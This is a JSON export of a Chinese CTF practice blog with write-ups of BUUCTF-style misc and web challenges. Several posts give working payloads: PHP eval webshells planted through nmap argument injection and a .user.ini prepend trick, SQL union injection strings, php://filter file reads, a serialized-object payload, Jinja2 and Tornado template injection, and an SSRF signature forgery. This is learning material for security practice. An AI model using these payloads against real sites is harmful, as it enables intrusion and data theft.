{"posts":[{"title":"[INSHack2019]gflag","content":"My brother likes esoteric programming. He sent me this file but I don't see what it is for. Could you help me ? 我哥哥喜欢深奥的程序设计。他给我发了这份文件，但我不知道是做什么用的。你能帮我个忙吗? GFlag files 查到WP https://cosmikflaghunters.wordpress.com/2019/05/05/inshack-2019-gflag/ G1 lines look like axis positioning, so we started to search printing coding and we found GCODE. As we don’t have a 3D printer, we have to simulate the printing online, we foud the website http://gcode.ws Add .gcode at the end of the file and upload it to the website: NSA{3d_pr1nt3d_fl49} ","link":"https://ro1ing.github.io/post/inshack2019gflag/"},{"title":"[HDCTF2019]信号分析","content":"2秒的音频没有声音 波形切换到波形（db）就有图像了 单个波形是有规律的 提示：Hackcube 使用HackCube-Special分析固定码信号 信号脉冲 固定码遥控信号的构成 FFFFFFFF 0001 停止码 看wp要得到FFFFFFFF0001然后{}包起来 ","link":"https://ro1ing.github.io/post/hdctf2019xin-hao-fen-xi/"},{"title":"[ALCTF]Misc","content":"校内CTF平台 题目 只会影响我拔剑的速度 gif逐帧播放 听我娓娓道来 属性-详细信息-备注 or 16进制 与佛论禅解密网站：http://www.keyfc.net/bbs/tools/tudoucode.aspx 电线鲨鱼 wireshark打开流量包 or 偷鸡 16进制 ","link":"https://ro1ing.github.io/post/alctfmisc/"},{"title":"[ASIS 2019]Unicorn shop","content":" 发现这里无论输入任何ID和Price都无法购买 当Price 小于10 时 显示Wrong commodity 当Price 大于10 时 显示Only one char（？） allowed！ utf8? https://xz.aliyun.com/t/5402#toc-0 2.3 数字显示 一些国家的数字在显示的时候也可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。ASIS CTF 2019 的 Unicorn Shop 也是从Unicode背后的数字角度出发考虑问题。 在这个网站查找Unicode https://www.compart.com/en/unicode 点开找到大于1337的字符即可 参考链接： https://www.cnblogs.com/Cl0ud/p/12221360.html https://shawroot.hatenablog.com/entry/2019/10/29/ASIS_2019-Unicorn_shop ","link":"https://ro1ing.github.io/post/asis-2019unicorn-shop/"},{"title":"[BJDCTF 2nd]EasyBaBa","content":"感觉 有东西压缩在里面 foremost分离 解压出一个 里面都是出题人.jpg 16进制查看是 视频格式 扫码得到 一点都不Easy😅 ","link":"https://ro1ing.github.io/post/bjdctf-2ndeasybaba/"},{"title":"[BJDCTF2020]Easy MD5","content":"抓包发现 Hint select * from 'admin' where password=md5($pass,true) 直接提交 ffifdyop md5()函数有两个参数 参数一是要加密的字符串； 参数二是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。 所以要通过注入 如何闭合sql语句？找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接 成 ‘ or’ 的形式绕过 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c 而这个字符串的前几位是 ‘or' 6 Mysql 刚好又会吧 hex 转成 ascii 解释， 因此拼接之后的形式是 1select * from 'admin' where password='' or '6xxxxx' 查看源代码 ?a=s155964671a&amp;b=s1091221200a md5碰撞：md5码不同但是表示的数字可能相同，故有md5碰撞导致可能会有安全问题 后来看发现这一步不用这么复杂 数组绕过： ?a[]=1&amp;b[]=2即可 拓展： ’ffifdyop：’129581926211651571912466741651878684928’ ffifdyop：T0Do#’or’8 129581926211651571912466741651878684928：’or’6]!r,b ","link":"https://ro1ing.github.io/post/bjdctf2020easy-md5/"},{"title":"[BJDCTF2020]杂项Misc","content":"认真你就输了 xls文件打开乱码 看下文件类型 16进制下发现时 压缩包 每个都看看 一叶障目 import zlib import struct #读文件 file = '1.png' #注意，1.png图片要和脚本在同一个文件夹下哦~ fr = open(file,'rb').read() data = bytearray(fr[12:29]) crc32key = eval(str(fr[29:33]).replace('\\\\x','').replace(&quot;b'&quot;,'0x').replace(&quot;'&quot;,'')) #crc32key = 0xCBD6DF8A #补上0x，copy hex value #data = bytearray(b'\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xF1\\x08\\x06\\x00\\x00\\x00') #hex下copy grep hex n = 4095 #理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了 for w in range(n):#高和宽一起爆破 width = bytearray(struct.pack('&gt;i', w))#q为8字节，i为4字节，h为2字节 for h in range(n): height = bytearray(struct.pack('&gt;i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] #print(data) crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) #写文件 newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+'.png','wb')#保存副本 fw.write(newpic) fw.close crc修复脚本 藏藏藏 binwalk分离 解压出word文档 文档里有个qr码 扫描得到 你猜我是个啥 查看文件头 png 图片二维码 扫出来不是 佛了 鸡你太美 在副本添加文件头 ","link":"https://ro1ing.github.io/post/bjdctf2020za-xiang-misc/"},{"title":"[BUUCTF 2018]Online Tool","content":"代码审计php escapeshellarg和escapeshellcmd使用不当导致rce 两个函数配合使用就会导致多个参数的注入。 escapeshellarg和escapeshellcmd的功能 escapeshellarg 1.确保用户只传递一个参数给命令 2.用户不能指定更多的参数一个 3.用户不能执行不同的命令 escapeshellcmd 1.确保用户只执行一个命令 2.用户可以指定不限数量的参数 3.用户不能执行不同的命令 关于escapeshellarg和escapeshellcmd使用不当导致rce 在https://paper.seebug.org/164/有详解 我们在这摘取 传入的参数是：172.17.0.2' -v -d a=1 经过escapeshellarg处理后变成了'172.17.0.2''' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1'，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1'，由于中间的\\被解释为\\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1'，即向172.17.0.2\\发起请求，POST 数据为a=1'。 回到mail中，我们的 payload 最终在执行时变成了'-fa'\\''( -OQueueDirectory=/tmp -X/var/www/html/test.php )@a.com'，分割后就是-fa(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的。 使用escapeshellcmd / escapeshellarg时不可能执行第二个命令。 但是我们仍然可以将参数传递给第一个命令。 这意味着我们也可以将新选项传递给命令。 利用漏洞的能力取决于目标可执行文件。 &lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; } if(!isset($_GET['host'])) { highlight_file(__FILE__); } else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host); }&gt; HTTP_X_FORWARDED_FOR获取到的IP地址 REMOTE_ADDR代表着客户端的IP 这两个都为比较常见的服务器获取ip echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host); 这有个system来执行命令有传参。 本意是要输入ip参数来进行扫描，我们可以利用两个函数的漏洞，来过滤。 -oG可以实现将命令和结果写到文件 payload可以通过写一个Shell到文件中 由此构造payload： '<?php @eval($_POST[\"hack\"]); ?> -oG hack.php ' 转化为： ''[\\''&lt;?php](file://''/ @eval($_POST[&quot;hack&quot;]); ?&gt; -oG hack.php '\\''' 输出为： &lt;?php @eval($_POST[hack]); ?&gt; -oG hack.php \\ 菜刀连接即可 参考链接： http://lz2y.top/index.php/2020/03/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-buuctf-2018online-tool/ https://note.redmango.top/Online%20Tool(BUUCTF%202018)/ https://paper.seebug.org/164/ https://blog.csdn.net/qq_26406447/article/details/100711933 https://blog.csdn.net/weixin_44077544/article/details/102835099 ","link":"https://ro1ing.github.io/post/buuctf-2018online-tool/"},{"title":"BUUCTFMisc基础","content":"金三胖 gif 使用fireworks 或其他 图像浏览软件 逐帧查看 二维码 qr码扫下 没有意义 在十六进制编辑器中发现有文件 使用 binwalk分离 4number.txt 和一个压缩包 压缩包 4位数字爆破 获得 N种方法解决 base64图片 是一个二维码 还原 data:image/jpg base64 大白 图片明显修改过 宽高度被篡改 使用TweakPNG Warning： Incorrect crc for IHDR chunk (is 6d7c7135, should be 8e14dfcf) 使用十六进制编辑器修改 回到图片 发现 基础破解 你一个压缩包，你并不能获得什么，因为他是四位数字加密的哈哈哈哈哈哈哈。。。不对==我说了什么了不得的东 西。。 四位数字 直接爆破 得到base64解密 你竟然赶我走 十六进制的最后发现了 LSB stegsolve解析 上面感觉有东西 使用 zsteg 解密一下 无 stegsolve 发现红黄蓝有字 生成图片 扫描获得 乌镇峰会种图 十六进制的最后 ningen binwalk分离 压缩包爆破四位数字 工具ziperello 获得 rar 爆破4位 qr 扫码 文件中的秘密 十六进制的中间 发现 镜子里面的世界 用stegsloves 分析 小明的保险箱 binwalk分离 四位密码爆破 爱因斯坦 binwalk 图片备注中有 压缩包密码 假如给我三天光明 解盲文 😦 kmdonowg 听摩斯电码 网上有摩斯电码的音频解析网站 当时是一点一点看的:( wireshark 使用wireshark 找到那条http login流量中的数据包 easycap 追踪 TCP流 被嗅探的流量 追踪 TCP流 流量包中发现 FLAG stegsloves 文件头是 zip 里面一个二进制文件 使用kali strings 另一个世界 十六进制最后一串二进制 转ascii码 得到 koekj3s 荷兰宽带数据泄露 下载附件得到一个conf.bin文件，路由器信息数据，一般包含账号密码。题目并没有提示flag是什么，猜测是账号或者密码加上格式为最终flag。 用RouterPassView查看后，搜索username或者password，最后发现是用户名 来首歌吧 右耳道摩斯密码 隐藏的钥匙 十六进制内 后门查杀 include下发现include.php为webshell文件 梅花香自苦寒来 snake binwalk 分离 将key中字符串解密 Serpent 有蛇的意思在西方神话是一条巨大的蛇型恶魔 anaconda 神秘龙卷风 压缩包 四位数字爆破 Brainfuck和Ook加解密 https://tool.bugku.com/brainfuck/ 面具下的 flag Brainfuck和Ook加解密 webshell后门 被劫持的神秘礼物 小明收到了一件很特别的礼物，有奇怪的后缀，奇怪的名字和格式。小明找到了知心姐姐度娘，度娘好像知道这是啥，但是度娘也不知道里面是啥。。。你帮帮小明？找到帐号密码，串在一起，用32位小写MD5哈希一下得到的就是答案。 wireshark http数据 拼接用户名密码得到adminaadminb 使用md5加密后得到1d240aafe21a86afc11f38a45b541a49 刷新过的图片 F5隐写 kali中 java Extract Misc.jpg 解密出一个伪加密的压缩包 穿越时空的思念 摩斯电码 秘密文件 binwalk分离文件 爆破密码 我吃三明治 一张图片 使用foremost 解出两张图片 看wp说是 在两张图片连接处 有类似与base32的字符串 ","link":"https://ro1ing.github.io/post/buuctfmisc-ji-chu/"},{"title":"CTFshow Web入门 信息收集篇","content":"其实还都是看大周师傅的wp才会做的 😃 https://www.d1a0.cn/2020/09/03/ctfshow-web%E5%85%A5%E9%97%A8%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ web1 题目：开发注释未及时删除 解：右键查看源代码 web2 题目：js前台拦截 解：禁止Javascript 右键查看源代码 或者 ctrl+u 快捷键 web3 题目： 没思路的时候抓个包看看，可能会有意外收获 解题思路： burp抓包，查看响应头，得到flag。 web4 访问robots.txt 得到提示 /flagishere.txt web5 题目： phps源码泄露有时候能帮上忙 解题思路： 根据提示，访问index.phps将文件下载下来，打开即可看到flag。 web6 题目： 解压源码到当前目录，测试正常，收工 解题思路： 访问www.zip ，下载源代码，查看index.php内容，发现flag在fl000g.txt中，这里注意压缩包里fl000g.txt中的flag不正确，应该访问题目环境中的fl000g.txt web7 题目： 版本控制很重要，但不要部署到生产环境更重要。 解题思路： 根据提示版本控制，想到常用的版本控制工具git，svn，尝试访问.git和.svn，在.git中发现flag。 web8 题目： 版本控制很重要，但不要部署到生产环境更重要。 解题思路： 上一题访问.git得到flag，这一题首先想到.svn，果然得到flag。 web9 题目： 发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了 解题思路： 提示vim异常关闭，想到linux下vi/vim异常关闭是会存留.swp文件，尝试访问index.php.swp，得到flag。 web10 题目： cookie 只是一块饼干，不能存放任何隐私数据 解题思路： 查看网页的cookie发现flag。 web11 题目： 域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息 解题思路： 在域名解析查询网站查询，http://dbcha.com/ ，逐个尝试，在Txt中发现flag。 web12 题目： 有时候网站上的公开信息，就是管理员常用密码 解题思路： 访问后台，/admin ，提示登录，猜想用户名为admin，密码应该在网站中，观察到页面底部有“Help Line Number : 372619038”，尝试输入数字，成功登录，得到flag。 web13 题目： 技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码 解题思路： 在网站中寻找技术文档（查看源代码寻找较为方便）,在底部找到document，点击即可查看到默认用户名，密码，访问http://.chall.ctf.show/system1103/login.php 。输入用户名和密码，即可得到flag。 web14 题目： 有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死 解题思路： 根据提示访问editor，出现文本编辑器，点击图片， 可以看到文件目录，/var/www/html/nothinghere 中有一个fl000g.txt，访问 http://6ce4a2ea-ac6a-4c12-84fa-40a347055991.chall.ctf.show/nothinghere/fl000g.txt 得到flag。 web15 题目： 公开的信息比如邮箱，可能造成信息泄露，产生严重后果 解题思路： 在网站底部发现一个qq邮箱，访问后台，发现可以有忘记密码选项，点击，密保问题是所在地城市，查找qq所在地为西安，输入，返回修改后的密码，登录即可得到flag。 web16 题目： 对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露 解题思路： 提到探针，就想到雅黑探针，访问/tz.php，点击PHP参数， 点击下图红框中文字 跳转到网站的phpinfo页面，在页面搜索flag，即可找到flag。 （关于php探针的内容可参考https://blog.csdn.net/weixin_43790779/article/details/108834213 ） web17 题目： 透过重重缓存，查找到ctfer.com的真实IP，提交flag{IP地址} 解题思路： https://icplishi.com 查询www.ctfer.com 的IP地址，得到IP地址即为flag。 web18 题目： 不要着急，休息，休息一会儿，玩101分给你flag 解题思路： 查看网页源代码，发现Flappy_js.js文件，访问可看到 将\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b 进行Unicode解码得到 “你赢了，去幺幺零点皮爱吃皮看看”。访问110.php得到flag。 web19 题目： 密钥什么的，就不要放在前端了 解题思路： 查看页面源代码，发现一段注释代码，代码中已经给出了用户名和密码，但是若有表单提交密码就会被加密，所以用hackbar工具，POST提交username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04 ，得到flag。 web20 题目： mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。 我是asp程序，我用的access数据库 直接查看url路径添加/db/db.mdb 下载之后，txt打开 control+f找flag 这里好像是需要用 sqlmap or 御剑来获取accesss数据库 小结 源代码 前端 js前台拦截 抓包：响应头 robots.txt phps源码泄露 index.phps 网站源码 www.zip 版本控制工具git svn .git .svn Linux vim异常关闭 保留临时文件.swp index.php.swp cookie 查看域名 http://dbcha.com/ /admin 后台 网站中找到技术文件document 查看默认账号密码 源码泄露editor信息 公开信息qq信息 - 密保 网站测试探针 雅黑探针 /tz.php 查看php参数 - phpinfo 前端出现密钥 hackbar post提交 asp+access框架数据库 /db/db.mdb ","link":"https://ro1ing.github.io/post/ctfshow-web-ru-men-xin-xi-shou-ji-pian/"},{"title":"[De1CTF 2019]SSRF Me","content":"看下源码 #! /usr/bin/env python #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500 result['msg'] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(&quot;/geneSign&quot;, methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) @app.route('/De1ta',methods=['GET','POST']) def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/') def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) SSRF 服务器请求伪造 SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。 Flask 框架 ​ Flask是一个用Python编写的Web应用程序框架，它基于Werkzeug WSGI工具包和Jinja2模板引擎。 ​ Flask也被称为“microframework” ，因为它使用简单的核心，用extension增加其他功能，它没有默认使用的数据库、窗体验证工具。 from flask import Flask app = Flask(name) @app.route('/') def hello_world(): return 'Hello, World!' @app.route和其它装饰器 要想明白“@app.route()”的工作原理，我们首先需要看一看Python中的装饰器（就是以“@”开头的那玩意，下面接着函数定义）。 究竟什么是装饰器？没啥特别的。装饰器只是一种接受函数（就是那个你用“@”符号装饰的函数）的函数，并返回一个新的函数。 当你装饰一个函数，意味着你告诉Python调用的是那个由你的装饰器返回的新函数，而不仅仅是直接返回原函数体的执行结果。 出题人给了hint:hint for [SSRF Me]: flag is in ./flag.txt geneSign() 获得param参数，通过action和param生成签名 challenge() 获得cookies中的action和sign,再去通过url传参获取param,并且使用Task对象，通过json返回Exec()方法 index 得到源码 在执行Exec方法的时候，调用 将传入的action和param参数和传入的sign参数进行比较。若相等则执行后面的操作。 所以只要我们后面传入的param和路由/De1ta下传入的param一样，然后action也等于scan。并且将/geneSign路由下返回的sign一样，就可以了。 看scan这个方法，就是访问param的网址，并将其内容的前50个字母返回回来。 于是在/geneSign路由下将param传参如下: 返回了我们自己构建的sign。 325d8600b490f9f3bd8423fde7d43c72 就知道了sign= 325d8600b490f9f3bd8423fde7d43c72 为什么要传入的参数是flag.txtread呢？ 因为它源码定义了action=scan.这在生成sign中是不可变的，又因为Exec方法中action必须有read和scan。所以定义为flag.txtread。 因为在self.action中必须包含scan和read。于是令action为readscan。read和scan顺序不可换。因为在Getsign方法中param在action前面，最终组成flag.txtreadscan. d18ebf74f746340f338d85c4ff131e3c 于是我们利用scan方法来读取flag.txt的内容。 Connection: close Cookie: action=readscan; sign=325d8600b490f9f3bd8423fde7d43c72 Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache get传参: param=flag.txt cookie： action=action sign=911db68eab96df16a18bc3521fb10d3d ","link":"https://ro1ing.github.io/post/de1ctf-2019ssrf-me/"},{"title":"[GXYCTF2019]佛系青年","content":"压缩包文件头损坏 伪加密 与佛论禅解密 ","link":"https://ro1ing.github.io/post/gxyctf2019fo-xi-qing-nian/"},{"title":"[HCTF2018]WarmUp","content":"F12 发现 !--source.php-- 查看source.php 查看一下hint.php flag not here, and flag in ffffllllaaaagggg 通过这种方式可以读取到 服务器上的任意文件 知识点：文件读取 ","link":"https://ro1ing.github.io/post/hctf2018warmup/"},{"title":"[SUCTF 2019]CheckIn","content":"先随便上传一个图片 这里是index.php 过滤掉了 先上传一个.user.ini .user.ini 这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER。 .user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。 在此可以查看：http://php.net/manual/zh/ini.list.php 这几种模式有什么区别？看看官方的解释： 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： auto_prepend_file=01.gif 01.gif是要包含的文件。 所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 参考链接：https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 解题 制作一个.user.ini的文件 再使用十六进制 修改文件头以便上传 GIF89A? auto_prepend_file=s.jpg 制作图片马 //有些题会过滤掉&lt;? 这里使用 GIF89A? &lt;script language='php'&gt;eval($_POST['a']);&lt;/script&gt; 蚁剑连接 ","link":"https://ro1ing.github.io/post/suctf-2019checkin/"},{"title":"[V&N2020 公开赛]HappyCTFd","content":"一个平台 先注册 登录试下 没有题目 只有一个我注册的用户和admin 抓包登录 这个可能是 防止爆破的把？ 没有头绪 忘记密码需要邮箱 看下write up 账户接管漏洞 https://www.colabug.com/2020/0204/6940556/amp/ 我们的攻击方式便很明显了： 利用添加空格绕过限制来注册一个与受害者用户名相同的账号 生成忘记密码链接发送到自己的邮箱 将自己的账号的用户名改成与被攻击者不相同的用户名 用邮箱中收到的链接更改密码即可。 这个漏洞分析比较简单，算是实战account takeover代码审计的一个不错的例子。 修改密码登入发现多了一个接口 将这个杂项题目中的文件下载下来 得到flag ","link":"https://ro1ing.github.io/post/vandn2020-gong-kai-sai-happyctfd/"},{"title":"[WesternCTF2018]shrine","content":"import flask import os app = flask.Flask(__name__) app.config['FLAG'] = os.environ.pop('FLAG') @app.route('/') def index(): return open(__file__).read() @app.route('/shrine/&lt;path:shrine&gt;') def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine)) if __name__ == '__main__': app.run(debug=True) 题目出现这个 flask引擎-jinja2模板注入 利用tplmap这个工具进行检测是否有模板注入漏洞 python tplmap.py -u Automatic Server-Side Template Injection Detection and Expleion tool [checks] Tested parameters appear to be not injectable 翻译： 服务器端模板自动注入检测和删除离子工具！][检查经过测试的参数似乎无法注入 模板渲染接受的参数需要用两个大括号括起来{ { } } 模板注入也在大括号里构造 在shrine路径下 ssti注入能运行 回头看下源码 app.config['FLAG'] = os.environ.pop('FLAG') 注册了一个名为FLAG的config，猜测这就是flag， 如果没有过滤可以直接{{config}}即可查看所有app.config内容 推测{{config}}可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号 不过python还有一些内置函数，比如url_for和get_flashed_messages /shrine/{{url_for.globals}} current_app-当前app，查看当下app中的config 得到flag 知识点： SSTI模板注入： 模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程 服务端把用户输入的内容渲染成模板就可能造成SSTI(Server-Side Template Injection) 引擎有不同的测试以及注入方式！ flask/jinja2模板注入 PHP/模版引擎Twig注入 ","link":"https://ro1ing.github.io/post/westernctf2018shrine/"},{"title":"[护网杯2018]easy_tornado","content":"都打开看看 /flag. txt flag in/flllllllag /welcome. txt render /hints. txt md5(cookie_secret+md5(filename) ) render()函数详解 1.render方法的实质就是生成 itemplate模板 2.通过调用一个方法来生成，而这个方法是通过 render方法的参数传递给它的 3.这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的htm内容 4.通过这三个参数，可以生成一个完整的木模板 tips： 1、render方法可以使用SX语法，但需要 Babel plugin插件 2、 render方法里的第三个参数可以使用函数来生成多个组件（特别是如果他们相同的话），只要生成结果是一个数组，且数组元素都是vNode即可 通过这种方式在网页上显示 render 标志着模板注入 render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用 测试一下 /error?msg={ {1*2} } 经过测试发现过滤 payload: /error?msg={ {handler.settings} } cookie_secret 是handler.application.settings 的 键值 拿到 cookie_secret 解密 import hashlib hash = hashlib.md5() filename='/fllllllllllllag' cookie_secret=&quot;8b1de274-3078-4412-a8c4-a6835eeda4a1&quot; hash.update(filename.encode('utf-8')) s1=hash.hexdigest() hash = hashlib.md5() hash.update((cookie_secret+s1).encode('utf-8')) print(hash.hexdigest()) 得到flag 拓展: #生成 Tornado 所需的 cookie_secret 的办法 import base64 import uuid base64.b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes) ","link":"https://ro1ing.github.io/post/hu-wang-bei-2018easy_tornado/"},{"title":"[极客大挑战 2019]LoveSQL","content":"用户登录界面 尝试使用万能密码 admin/1'or'1'='1 测试单引号' 观察是否有报错信息 这里我就可以知道为 字符型注入 如果是整形 报错信息为“12’” 所以我们要使用到闭合语句来完成 字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。 这里使用 %23 来闭合 不知道这里为什么 # --+ 不行 payload： ?username=1&amp;password=12' %23 没有报错有回显 NO 尝试联合注入 ?username=1&amp;password=12' union select 1%23 回显 The used sELECT statements have a different number of columns 提示了我们后面有更多的列数 添加更多的列 ?username=1&amp;password=12' union select 1,2,3%23 查询当前数据库名字 ?username=1&amp;password=12' union select 1,database(),3%23 发现库名geek 在2字段使用group_concat()无效 查询一下3字段 ?username=1&amp;password=12' union select 1, 2, group_concat(table_name)from information_schema.tables where table_schema='geek' %23 看到geek里面有两个表 再查列 ?username=1&amp;password=12' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='geek' %23 ?username=1&amp;password=12' union select 1, 2, group_concat(password) from lovelysq1 %23 得到flag 知识点: 字符型注入 字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。 ","link":"https://ro1ing.github.io/post/ji-ke-da-tiao-zhan-2019lovesql/"},{"title":" [ZJCTF 2019]NiZhuanSiWei","content":"代码审计 查看一下useless.php --只有注释信息 没有用 利用data协议绕过 将welcome to the zjctf写入 而data://协议允许读入 payload： text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 到这里就不会了 只有看下wp了 正则判断里面是否有flag字符，如果没有的话，并运行指定文件。 利用filter来进行读取指定文件 payload： file=php://filter/read=convert.base64-encode/resource=useless.php 得到 base64解码 &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } ?&gt; 将flag调用，然后给里面file值赋值为flag.php。 序列化后传入password，应该就会出flag。 O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 三者结合 payload： ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 得到flag 知识点： 序列号与反序列化知识： https://www.jianshu.com/p/631606cc5b76 https://www.cnblogs.com/20175211lyz/p/11403397.html 类型 结构结构 String(字符串) s:size:value; Integer(整型) i:value; Boolean(布尔型) b:value;(保存1或0) Null N; Array(列) a:size:{key definition;value definition;(repeated per element)} Object O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 例如这里，O代表对象，4为对象长度，1代表有一个成员变量。 ","link":"https://ro1ing.github.io/post/buuctf-web/"},{"title":"静态网站和动态网站的区别","content":"静态网站：没有进行数据交互的网页，不支持数据传输，页面后缀一般是“.html”。 静态网站是最初的建站方式，浏览者所看到的每个页面是建站者上传到服务器上的一个 html （ htm ）文件，这种网站每增加、删除、修改一个页面，都必须重新对服务器的文件进行一次下载上传。网页内容一经发布到网站服务器上，无论是否有用户访问，每个静态网页的内容都是保存在网站服务器上的，也就是说，静态网页是实实在在保存在服务器上的文件，每个网页都是一个独立的文件； 静态网页的内容相对稳定，因此容易被搜索引擎检索； 静态网页没有数据库的支持，在网站制作和维护方面工作量较大，因此当网站信息量很大时完全依靠静态网页制作方式比较困难；静态网页的交互性较差，在功能方面有较大的限制。 动态网站：支持数据交互的网站 交互性：网页会根据用户的要求和选择而动态地改变和响应，浏览器作为客户端，成为一个动态交流的桥梁，动态网页的交互性也是今后 Web 发展的潮流。 自动更新：即无须手动更新 HTML 文档，便会自动生成新页面，可以大大节省工作量。 因时因人而变：即当不同时间、不同用户访问同一网址时会出现不同页面。 